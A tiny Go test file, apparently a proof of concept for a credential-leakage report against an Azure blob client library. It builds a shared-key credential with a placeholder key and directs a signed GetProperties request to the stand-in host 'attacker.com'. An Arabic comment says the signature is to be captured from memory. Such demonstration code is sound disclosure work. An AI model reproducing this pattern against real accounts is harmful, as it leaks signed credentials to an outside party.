package azblob

import (
	"context"
	"testing"
)

func TestImpact_CredentialLeakage(t *testing.T) {
	cred, _ := NewSharedKeyCredential("victim_account", "R2VuZXJpYyBLZXkgZm9yIFBvQyAxMjM0NTY3ODkwCg==")
	// لا يهم الرابط هنا لأننا سنلتقط التوقيع من الذاكرة قبل الإرسال
	client, _ := NewClientWithSharedKeyCredential("https://attacker.com", cred, nil)
	_, _ = client.GetProperties(context.Background(), nil)
}
